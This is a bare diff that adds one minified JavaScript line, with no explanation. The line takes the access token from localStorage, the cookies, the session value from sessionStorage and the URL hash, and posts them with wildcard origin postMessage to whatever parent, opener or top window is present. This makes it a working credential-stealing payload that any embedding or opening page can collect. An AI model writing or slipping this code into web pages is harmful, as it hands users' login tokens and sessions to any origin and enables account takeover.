@@ -1,0 +1,1 @@
+parent.postMessage(location.href,"*"),window.opener.postMessage({token:localStorage.getItem("access_token")},"*"),parent.postMessage(document.cookie,"*"),window.parent.postMessage(JSON.stringify({type:"auth",hash:location.hash}),"*"),top.postMessage({session:sessionStorage.getItem("session")},"*");
